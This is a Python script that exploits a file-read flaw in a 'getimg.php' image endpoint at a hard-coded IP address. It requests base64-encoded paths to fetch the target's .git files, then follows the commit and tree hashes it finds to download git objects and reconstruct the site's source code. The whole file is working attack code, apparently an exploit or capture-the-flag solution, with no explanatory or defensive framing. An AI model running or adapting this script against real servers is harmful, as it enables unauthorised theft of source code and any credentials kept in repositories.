import os, subprocess
import wget
import re
import urlparse
import base64
import urllib



dotgit = [
	".git/COMMIT_EDITMSG",
    ".git/FETCH_HEAD",
    ".git/HEAD",
    ".git/ORIG_HEAD",
    ".git/config",
    ".git/description",
    ".git/logs/HEAD",
    ".git/logs/refs/heads/master",
    ".git/logs/refs/remotes/origin/HEAD",
    ".git/logs/refs/remotes/origin/master",
    ".git/logs/refs/stash",
    ".git/refs/heads/master",
    ".git/refs/remotes/origin/HEAD",
    ".git/refs/remotes/origin/master",
    ".git/refs/stash"
]

SHA1_hash = list()


target = "http://3.91.17.218/getimg.php?img="

def check_file(target, filename):
	proc = subprocess.Popen("curl {}{}".format(target, urllib.quote_plus(base64.b64encode(filename))), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
	(out, err) = proc.communicate()
	if not re.search(filename, out):
		return True
	return False

def download(target, filename):
	if not os.path.exists(os.path.join(".", urlparse.urlparse(target).netloc.replace(":", "_"))):
		os.makedirs(os.path.join(".", urlparse.urlparse(target).netloc.replace(":", "_")))
	path = os.path.join(".", urlparse.urlparse(target).netloc.replace(":", "_"), filename)
	if not os.path.exists(os.path.join(*path.split("/")[:-1])):
		os.makedirs(os.path.join(*path.split("/")[:-1]))
	print("Downloading: " + filename)
	wget.download(target+urllib.quote_plus(base64.b64encode(filename)))
	os.rename("./getimg.php", path)
	print("\n")


for i in dotgit:
	if check_file(target, i):
		download(target, i)
		proc = subprocess.Popen("curl {}{}".format(target, urllib.quote_plus(base64.b64encode(i))), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		(out, err) = proc.communicate()
		for i in re.findall("[0-9a-f]{40}", out):
			SHA1_hash.append(i)

SHA1_hash = list(set(SHA1_hash))



for h in SHA1_hash:
	if check_file(target, ".git/objects/"+h[:2]+"/"+h[2:]):		
		download(target, ".git/objects/"+h[:2]+"/"+h[2:])

		proc = subprocess.Popen("cd {};git cat-file -t {}".format(urlparse.urlparse(target).netloc.replace(":", "_"), h), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		(out, err) = proc.communicate()
		if out == "tree\n":
			proc = subprocess.Popen("cd {};git cat-file -p {}".format(urlparse.urlparse(target).netloc.replace(":", "_"), h), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
			(out, err) = proc.communicate()
			print(out)
		
		proc = subprocess.Popen("cd {};git cat-file -p {}".format(urlparse.urlparse(target).netloc.replace(":", "_"), h), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		(out, err) = proc.communicate()
		
		for i in re.findall("[0-9a-f]{40}", out):
			if i not in SHA1_hash:
				SHA1_hash.append(i)
